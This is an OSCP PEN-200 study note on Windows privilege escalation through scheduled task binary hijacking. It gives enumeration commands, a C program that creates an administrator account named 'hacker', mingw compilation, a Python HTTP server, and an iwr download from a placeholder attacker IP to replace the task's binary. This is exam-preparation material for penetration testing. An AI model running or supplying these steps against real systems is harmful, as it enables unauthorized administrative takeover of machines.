# 🪟 OSCP PEN-200 — Scheduled Task Privilege Escalation

> **Goal:** Find a scheduled task running as admin → replace its binary
> → wait for trigger → escalate privileges

---

## 📖 Concept

Scheduled tasks run programs automatically based on triggers. If a task runs
as a privileged user and executes a binary **you can write to**, you can replace
that binary with a malicious one and inherit the task's privileges when it fires.

```
Find task running as admin/SYSTEM
→ locate the binary it executes
→ check if binary is writable
→ replace with malicious binary
→ wait for trigger
→ binary runs as admin/SYSTEM
```

---

## ❓ Three Questions to Answer

| Question | Why it matters |
|---|---|
| **Who does the task run as?** | Must be admin/SYSTEM to be useful |
| **When does it trigger?** | Must trigger in future within your timeframe |
| **What binary does it execute?** | Must be writable by your current user |

---

## 🗺️ Attack Flow

### Step 1 — Enumerate Scheduled Tasks

```powershell
# Full verbose list — most detail
schtasks /query /fo LIST /v

# Quick overview
schtasks /query /fo TABLE
```

**Key fields to look for:**

| Field | What to look for |
|---|---|
| `Run As User` | `SYSTEM`, admin, or privileged user |
| `Task To Run` | Path to the binary/script executed |
| `Next Run Time` | Must be in the future |
| `Schedule Type` | How often it runs (every minute = ideal) |
| `Author` | Who created the task |

---

### Step 2 — Check Permissions on the Binary

```powershell
icacls "C:\path\to\task\binary.exe"
```

**Look for write access for your user:**

| Permission | Exploitable? |
|---|---|
| `CurrentUser:(F)` | ✅ Full access |
| `CurrentUser:(M)` | ✅ Modify access |
| `BUILTIN\Users:(W)` | ✅ Write access |
| `BUILTIN\Users:(RX)` | ❌ No |

> Binaries in user home directories (`C:\Users\<name>\`) are almost always writable by that user.

---

### Step 3 — Create Malicious Binary (Kali)

```c
// adduser.c
#include <stdlib.h>

int main()
{
    int i;
    i = system("net user hacker password123! /add");
    i = system("net localgroup administrators hacker /add");
    return 0;
}
```

```bash
x86_64-w64-mingw32-gcc adduser.c -o binary.exe
python3 -m http.server 80
```

> Name the output to **match the original binary name exactly**.

---

### Step 4 — Transfer & Replace Binary (Target)

```powershell
# Download
iwr -Uri http://<KALI_IP>/adduser.exe -Outfile binary.exe

# Backup original
move C:\path\to\task\binary.exe binary.exe.bak

# Replace
move .\binary.exe C:\path\to\task\binary.exe
```

---

### Step 5 — Wait for Trigger & Verify

```powershell
# Wait for the next scheduled run, then check
net user
net localgroup administrators
```

> No manual restart needed — the Task Scheduler fires the binary automatically.

---

### Step 6 — Restore

```powershell
move binary.exe.bak C:\path\to\task\binary.exe
net user hacker /delete
```

---

## ⚖️ Scheduled Tasks vs Service Binary Hijacking

| | Service Binary Hijacking | Scheduled Task |
|---|---|---|
| What you replace | Service `.exe` | Task action binary |
| How you trigger | `net stop/start` or reboot | Wait for schedule |
| Runs as | Service account | Task's configured user |
| You control timing? | ✅ Yes | ❌ No — depends on schedule |
| Needs service perms? | ✅ Yes | ❌ No |

---

## ⚡ Quick Reference

```powershell
# Enumerate all tasks verbosely
schtasks /query /fo LIST /v

# Check binary permissions
icacls "C:\path\to\binary.exe"

# Backup and replace
move C:\path\to\binary.exe binary.exe.bak
move .\evil.exe C:\path\to\binary.exe

# Verify after trigger fires
net user
net localgroup administrators
```

```bash
# Kali — compile
x86_64-w64-mingw32-gcc adduser.c -o binary.exe

# Kali — serve
python3 -m http.server 80
```

---
